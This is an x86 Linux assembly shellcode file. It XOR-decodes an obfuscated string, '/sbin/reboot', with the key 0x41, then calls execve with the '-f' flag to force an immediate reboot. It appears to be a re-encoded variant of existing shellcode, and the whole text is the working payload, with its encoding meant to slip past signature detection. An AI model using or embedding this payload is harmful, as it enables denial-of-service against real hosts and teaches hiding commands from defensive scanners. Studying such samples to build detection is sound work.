
global _start

section .text

_start:

	xor eax,eax 			;reset eax
	xor edx, edx			;reset edx
	push eax			;null terminator, pushing in reverse order
	push 0x352e2e23			;encrypted first string
	push 0x24336e2f			;encrypted second string
	push 0x2823326e			;encrypted third string
	mov edx, esp			;edx now has the refrence to the top of the stack
	xor ecx, ecx			;reset ecx for loop
	mov cl, 12			;number of loop iteriations
loop:
	xor byte [edx], 0x41		;xoring with key to decrypt
	inc edx				;next byte
	loop loop			
	mov ebx, esp			;decrypted string moved to ebx from top of the stack
	push eax			; 0
	push word 0x662d 		; -f paramter
	mov esi,esp			; -f 0
	push eax			; from the original shellcode			
	push esi			; from the original shellcode
	push ebx			; from the original shellcode
	mov ecx,esp			; ecx now has the final name
	mov al,0xb			; sys call 11, which is execve
	int 0x80			; initiate syscall

